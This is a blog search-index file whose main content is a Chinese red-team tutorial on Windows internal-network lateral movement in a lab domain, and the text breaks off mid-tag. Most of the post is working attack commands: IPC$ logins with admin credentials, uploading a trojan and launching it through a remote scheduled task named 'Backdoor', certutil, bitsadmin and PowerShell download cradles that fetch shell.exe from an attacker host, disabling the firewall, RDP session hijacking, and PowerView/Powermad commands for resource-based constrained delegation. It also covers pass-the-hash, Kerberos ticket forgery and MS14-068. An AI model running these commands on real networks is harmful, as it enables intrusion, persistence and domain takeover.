<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/"/>
    <url>/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="通信与防火墙规则"><a href="#通信与防火墙规则" class="headerlink" title="通信与防火墙规则"></a>通信与防火墙规则</h1><h1 id="横向移动手法"><a href="#横向移动手法" class="headerlink" title="横向移动手法"></a>横向移动手法</h1><h2 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h2><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><ul><li><p>概念：</p><p>IPC（Internet Process Connection）是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p></li><li><p>条件：</p><ol><li>目标主机开启了IPC连接</li><li>目标主机的139和445端口开放</li><li>知道目标机器的用户名和明文密码</li></ol></li><li><p>作用：</p><p>利用IPC连接后可以用于上传木马，查看目标主机的目录结构，使用定时任务来运行木马</p></li><li><p>使用：</p><p>建立IPC连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\192.168.11.11\IPC$ <span class="hljs-string">&quot;密码&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br>net use \\192.168.11.11\IPC$ <span class="hljs-string">&quot;Mim&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162741515.png" class title="image-20250420162741515"><p>查看目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\192.168.11.11\C$<br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420155835110.png" class title="image-20250420155835110"><p>上传木马</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">copy</span> .\<span class="hljs-number">789</span>t.exe \\<span class="hljs-number">192.168.11.11</span>\C$<br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420160027454.png" class title="image-20250420160027454"><p>也可以将目标机器的C盘映射到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use z: \\192.168.11.11\c$ <span class="hljs-comment">#已经建立了IPC连接</span><br>net use z: \\192.168.11.11\c$ <span class="hljs-string">&quot;密码&quot;</span> /user:<span class="hljs-string">&quot;yankun\administrator&quot;</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420162630911.png" class title="image-20250420162630911"><p>创建定时任务运行</p><p>由于在2008及以后的系统中已经将at命令废弃，所以只将将schtasks命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Create /S 192.168.11.11 /TN Backdoor /SC minute /MO 1 /TR C:\789t.exe /RU System /F /U yankun\administrator /P 密码<br><span class="hljs-comment"># /s，指定要连接到的系统</span><br><span class="hljs-comment"># /TN，指定要创建的计划任务名称</span><br><span class="hljs-comment"># /SC，指定计划任务频率</span><br><span class="hljs-comment"># /MO，制定计划任务执行周期</span><br><span class="hljs-comment"># /TR，指定计划任务运行的程序路径</span><br><span class="hljs-comment"># /RU，指定计划任务运行的用户权限</span><br><span class="hljs-comment"># /F，如果指定的任务存在则强制创建</span><br></code></pre></td></tr></table></figure><p>检查是否添加成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Query /S 192.168.11.11 /U yankun\administrator /P 密码 | findstr <span class="hljs-string">&quot;Backdoor&quot;</span>#未建立IPC连接，已经建立了IPC连接就不需要输入用户名和密码了<br></code></pre></td></tr></table></figure><p>立即启动计划任务，然后就是等待上线了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /RUN /S 192.168.11.11 /I /TN Backdoor /U yankun\administrator /P 密码#未建立IPC连接<br></code></pre></td></tr></table></figure><p>删除计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /Delete /S 192.168.11.11 /TN Backdoor /F /U yankun\administrator /P 密码#未建立IPC连接<br></code></pre></td></tr></table></figure><p>删除IPC连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\192.168.11.11\ipc$ /delete<br>net use * /delete#删除全部连接<br></code></pre></td></tr></table></figure><p>impacket工具</p></li></ul><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><ul><li><p>概念：又称为CIFS（Common Inter File System,网络文件共享系统），由微软开发，基于应用层网络传输协议，SMB一般使用NetBIOS协议或者TCP发送，分别使用端口是139或445，现在常用445端口</p></li><li><p>作用：使网络上的计算机能够共享文件夹，打印机等等</p></li><li><p>条件：可以用公网VPS或者本地机器搭建SMB服务器（需要解决通信的问题）就是要让目标机器能够访问到SMB服务器，还有要使用SMB匿名共享</p></li><li><p>使用：</p><p>以linux服务器作为演示</p><p>搭建一个名为yankunsmb，共享目录指向<code>/root/share</code>的SMB匿名共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /root/share<br>python3 smbserver.py yankunsmb /root/share -smb2support<br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420212617616.png" class title="image-20250420212617616"><p>从SMB Server下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy  \\172.19.228.211\\yankunsmb\shell.exe shell.exe<br></code></pre></td></tr></table></figure><p>上传文件到SMB Server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use z: \\172.19.228.211\yankunsmb <span class="hljs-comment">#将SMB共享文件夹映射到本地的一个网络驱动器 </span><br>copy 1.txt x:<br><br>net use z: /delete<br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250420213337974.png" class title="image-20250420213337974"></li></ul><h2 id="使用Windows自带工具"><a href="#使用Windows自带工具" class="headerlink" title="使用Windows自带工具"></a>使用Windows自带工具</h2><ol><li><p>Certutil</p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://ip:port/shell.exe C:\shell.exe<br></code></pre></td></tr></table></figure></li><li><p>BITSAdmin</p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer <span class="hljs-built_in">test</span> http://ip：port/shell.exe C:\shell.exe#创建一个<span class="hljs-built_in">test</span>任务<br></code></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-WebRequest -Uri http://ip:port/shell.exe -OutFile C:\shell.exe<br></code></pre></td></tr></table></figure></li></ol><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><ul><li><p>概念：用户可以通过WMI管理本地和远程计算机，Windows为远程传输WMI数据提供了两个可用的协议，分布式组件对象模型DCOM(Distributed Component Object Model)和Windows远程管理(Windows Remote Management)WinRM使得WMI对象的查询，时间注册，WMI类方法的执行和类的创建等操作都能够远程执行</p></li><li><p>条件：</p><ol><li>远程主机的WMI服务为开启状态（默认是开启的）</li><li>远程主机的防火墙放行135端口（出站协议）</li></ol></li><li><p>作用：</p></li><li><p>使用：</p><p>使用Windows自带的wmic.exe和PowerShell Cmdlet来使用WMI数据和执行WMI方法</p><p>执行yuan</p></li></ul><h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><p>前提是获取了账户的明文密码</p><p>远程叫做远程桌面协议（Romte Desktop Protocol），默认是监听3389端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"> reg query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections  <span class="hljs-comment">#通过查询注册表来查看是否开启了远程桌面，其中0x0为开启，为1则为禁用</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204341033.png" class title="image-20250424204341033"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  <span class="hljs-comment">#注册表开启3389端口</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Open 3389&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=TCP localport=3389  <span class="hljs-comment">#添加防火墙规则</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>   <span class="hljs-comment">#winsows server 2003 之前</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#winsows server 2003 之后</span><br></code></pre></td></tr></table></figure><p>RDP远程登录前提获取了明文的密码，但是只能获取hash又该怎么办呢？</p><p>RDP会话劫持：</p><p>条件：</p><ul><li><p>需要获取了stystem权限（可以使用微软自带工具PSexec提权我没有复线成功就没写了）</p></li><li><p>主机上还有其他用户的会话</p><p>可以使用query user查看</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204542050.png" class title="image-20250424204542050"><p>低权限劫持高权限不需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc create rdp binpath= <span class="hljs-string">&quot;cmd.exe /k tscon 1 /dest:console&quot;</span> <span class="hljs-comment">#需要获取到system权限，这个命令就是用sc创建一个system权限运行的cmd服务</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250424204743483.png" class title="image-20250424204743483"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc qc rdp     <span class="hljs-comment">#查询服务</span><br>sc start rdp  <span class="hljs-comment">#启动服务</span><br></code></pre></td></tr></table></figure><p>配合桌面辅助功能后门利用</p><p>就是讲windows一些粘滞键，屏幕键盘，放大镜，屏幕阅读这些快捷键改为cmd.exe（可以配合PSexec来操作）</p></li></ul><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><ul><li><p>概念：</p><p>哈希传递（Pass The Hash，PTH）是一种窃取用户的hash，使用用户hash来验证身份的攻击方法（无需用户的明文密码），但是在 Windows Server 2012 R2之后，lsass.exe进程中抓不到明文密码了。微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997，关闭了Wdigest功能。使其攻击无法在内存中抓取到明文密码了，并且打了KB2871997补丁，只有sid&#x3D;500（Administrator）才能进行哈希传递攻击，这给我们的难度也大大增加了</p></li><li><p>原理：</p><p>NTLM协议支持通过hash值来确认身份</p><p>当用户尝试访问远程系统（SMB、WMI、WinRM）时候，系统会将hash发送给目标服务器验证，所以如果攻击者如果在内存中抓取到用户的NTLM哈希，就可以伪造该用户，直接将hash传给服务器，无需明文密码</p></li></ul><h2 id="Kerberos攻击方法"><a href="#Kerberos攻击方法" class="headerlink" title="Kerberos攻击方法"></a>Kerberos攻击方法</h2><p>域内用户名枚举：<br>原理：通过Kerberos的AS_REQ工作原理进行枚举，由于用户名存在和不存在的报错不一样，由此可以用来枚举用户</p><p>密码喷洒</p><p>Kerberoasting：</p><p>离线破解TGS_REP有服务器的hash加密的ST，破解服务器的密码（本质是依靠字典破解密码）</p><p><strong>利用条件：</strong></p><p>ASRepRoasting：</p><p>离线破解用户密码，通过破解AS_REP的用用户密码派生的密钥加密的会话密钥（Login Session Key）,为什么能够破解用户密码，若用户密码是<code>P@ssw0rd</code>，KDC会用<code>P@ssw0rd</code>派生的密钥加密<code>Login Session Key</code>，攻击者尝试用<code>P@ssw0rd</code>生成密钥解密<code>enc-part</code>，若成功则确认密码正确。</p><p><strong>利用条件：</strong></p><p>需要开启不需要kerberos预身份验证</p><h3 id="MS14-068："><a href="#MS14-068：" class="headerlink" title="MS14-068："></a>MS14-068：</h3><p><strong>漏洞的作用：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">将普通域用户权限提升为域控权限<br></code></pre></td></tr></table></figure><p><strong>漏洞原因：</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">KDC无法正确校验<span class="hljs-keyword">PAC</span>的签名是否正确<br></code></pre></td></tr></table></figure><p><strong>利用条件：</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">没有安装MS14-<span class="hljs-number">068</span>补丁（KB<span class="hljs-number">3011780</span>）<br><br>获取域内一台主机的普通域用户名以及密码或者哈希，还有该用户的SID<br></code></pre></td></tr></table></figure><p><strong>工具：</strong></p><p><strong>使用：</strong></p><p>需要先检查是否打过这个补丁KB3011780</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmic qfe get HotFixID,InstalledOn<br>or<br>systeminfo |<span class="hljs-built_in">findstr</span> &quot;KB3011780&quot;<br>or<br>wmic qfe GET hotfixid |<span class="hljs-built_in">findstr</span> &quot;KB3011780&quot;<br></code></pre></td></tr></table></figure><p>查找是否有HotFixID 为KB3011780的记录，我这台主机就没有安装这个补丁就可以打</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250423143317831.png" class title="image-20250423143317831"><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><ul><li><h4 id="黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）"><a href="#黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）" class="headerlink" title="黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）"></a>黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）</h4><p>在Kerberos认证的过程，Client通过AS(Authentication，身份认证服务)认证后，AS会生成一个Logon Session Key(会话密钥用于与TGS（Ticket Granting Server，票据授权服务器）通信的临时密钥)和TGT（Ticket Granting Ticker，票据授权凭证）（包含用户ID，客户端IP，有效期，会话密钥，SID及所在的组等，这些信息（也叫做PAC(Privilege Attribute Certificate，特权属证书)）会被krbtgt的NTLM Hash加密），在AS_REP中会将Logon Session Key用用户密码派生的密钥加密，如果获取了krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key，然后来到下一步Client与TGS的交互。现在有了金票就跳过了AS验证，不用验证账户和密码，也不用担心域管改密码了</p><p><strong>利用条件</strong>：</p><p>获取<strong>krbtgt的hash</strong>，域名，域的sid</p></li><li><h4 id="白银票据伪造原理："><a href="#白银票据伪造原理：" class="headerlink" title="白银票据伪造原理："></a>白银票据伪造原理：</h4><p>在Client与TGS的交互的过程中，Client会将（服务器ID，TGT,认证器（Authenticator，包含用户ID和时间戳，用会话密钥加密）），TGS在接受到Client的请求后会用使用krbtgt的NTLM Hash来解密TGT，得到会话密钥之后，用来解密认证器，然后比对是否与TGT解密中用户ID和时间戳的结果相同，如果相同则会在生成，服务会话密钥和服务票据（Service Ticket，简称ST，包含用户ID，IP，有效期，服务会话密钥，这些信息都是被服务器的NTLM-hash加密的），在Kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT正确，都会返回ST。最后一步，Client利用ST去请求服务，服务使用自己的NTLM-hash解密ST，如果正确，就会将PAC（包含Client的相关权限信息）给KDC解密，KDC由此判断Client是否又访问服务权限，当然，如果没有设置PAC，就不会去KDC求证，所以说如果获取了Server用户的Hash就可以伪造一个ST出来</p><p><strong>利用条件：</strong><br>获取到<strong>目标服务的hash</strong>，域名，域的sid</p></li></ul><h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>委派简单说是传话的过程，皇帝下达了减免赋税的政策，朝廷里面的官员再把任务下发给地方官员来完成。</p><h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a><strong>非约束委派攻击</strong></h4><p>管理员访问了一个开启了非约束委派的服务器，这个服务器将会保存域管理员的TGT到内存中，那么服务器就可以访问域中的任何域管理员可以访问的服务</p><p>配合打印机Spooler漏洞+非约束委派攻击</p><p>背景：<br>域控开启了打印机Spooler服务</p><p>获取了一台开启了非约束委派的服务器</p><p>非约束委派的服务器可以像打印机服务发起诱导连接，让域控主动去认证到攻击者控制的服务器上</p><p>流程：</p><p>攻击机上使用（Rubenus，Impacker）监听</p><p>利用printerbug，spoolsample工具，强制让域控发起SMB认证到你的服务（认证请求会包含域控的TGT票据）</p><p>从而可以访问域控所能访问的任何服务了</p><h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a><strong>约束委派攻击</strong></h4><p>获取到一个DC指定的约束委派的机器允许访问DC的CIFS服务（记为web），DC允许了该服务器指定任意用户访问DC的CIFS服务，所以只要web服务器控制了任意一个用户的身份（TGT）就可以访问DC的CIFS服务</p><p>流程：</p><p>使用工具获取administrator的用户票据</p><p>在使用工具使用administrator的用户票据访问DC的CIFS服务获取域控的票据</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xl">[你控制的机器]<br>    ↓<br><span class="hljs-number">1</span>. S4U2S<span class="hljs-function"><span class="hljs-title">elf</span>请求 -&gt;</span> 拿到任意用户（如Administrator）对自己的票据<br>    ↓<br><span class="hljs-number">2</span>. S4U2P<span class="hljs-function"><span class="hljs-title">roxy</span>请求 -&gt;</span> 代表Administrator访问指定后端服务（如CIFS）<br>    ↓<br><span class="hljs-number">3</span>. 拿到TGS，横向移动、提权<br></code></pre></td></tr></table></figure><h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a><strong>基于资源的约束委派</strong></h4><p>RBCD(Resource Based Constrained Delegation)：</p><p>是在Windows Server 2012中加入的，与传统的约束委派相比，不需要域管来设置相关属性，而是将委派的权限交给服务器本身来决定，服务机器在自己账户配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性即可，这个<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的功能就是允许谁可以委派用户来访问我。</p><p>总结为一句话：</p><p>攻击者能够控制一个计算机用户，并且把自己新建的机器加入到目标机器的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>就能伪造任意域用户（Administratot）访问目标机器，所以RBCD的重点是需要找到可以修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的用户</p><p><strong>攻击条件：</strong></p><p>1.具有修改目标机器<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</p><p>2.可以创建机器账户，因为自己创建的机器账户知道密码（或已知机器账户）</p><p>创建机器账户那还好说，关键是什么用户具有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限呢？</p><p>1.主机加入域的用户账户：dbadmin机器加入了域内web的用户，web用户对dbadmin<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的属性具有修改权</p><p>2.Account Operator组成员可以修改域内任意主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p><p>3.该主机的机器账户</p><p>接下来按照利用顺序依次说明</p><p><strong>1、测试环境：</strong></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webpcx，加入域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminx，也是加入了域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=<span class="hljs-number">805306369</span>))&quot; cn mS-DS-CreatorSID   #在 god.org 域内查找所有计算机账户，并列出计算机名和用户信息(sid信息)<br></code></pre></td></tr></table></figure><p>可以见webpc和adminx都是加入同一个域内用户与域控的信息一致</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023055633.png" class title="image-20250505023055633"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505024109792.png" class title="image-20250505024109792"><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(objectsid=S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">345784219</span>-<span class="hljs-number">2510415755</span>-<span class="hljs-number">3375813427</span>-<span class="hljs-number">1103</span>))&quot; objectclass cn dn<br></code></pre></td></tr></table></figure><p>通过这个sid的值可以查看是域内哪一个用户，最后发现是域内一个叫web的用户</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023833245.png" class title="image-20250505023833245"><p>使用<a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>项目中Powermad.ps1脚本创建机器账户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powermad.ps1;<span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> yankun <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-Securestring</span> <span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-comment">#添加机器账户</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030638420.png" class title="image-20250505030638420"><p>在dc上可以看看是否成功创建了计算机名为yankun的机器</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030726739.png" class title="image-20250505030726739"><p>成功创建，然后查看yankun的sid值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powerview.ps1;<span class="hljs-built_in">Get-NetComputer</span> yankun <span class="hljs-literal">-Properties</span> objectsid  <span class="hljs-comment">#获取新增计算机名yankun的sid，S-1-5-21-345784219-2510415755-3375813427-1112</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505141658876.png" class title="image-20250505141658876"><p>接下来就是，修改dbaminx计算机中<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性值为我们新建计算机的sid</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell Import-Module .\PowerView.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">345784219</span>-<span class="hljs-number">2510415755</span>-<span class="hljs-number">3375813427</span>-<span class="hljs-number">1112</span>)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, <span class="hljs-number">0</span>);Get-DomainComputer DBADMINX| <span class="hljs-built_in">Set</span>-DomainObject -<span class="hljs-built_in">Set</span> @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose<br><br>###powershell Import-Module .\PowerView.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;sid)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, <span class="hljs-number">0</span>);Get-DomainComputer 目标机器计算机名| <span class="hljs-built_in">Set</span>-DomainObject -<span class="hljs-built_in">Set</span> @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose<br></code></pre></td></tr></table></figure><p>成功修改</p><img 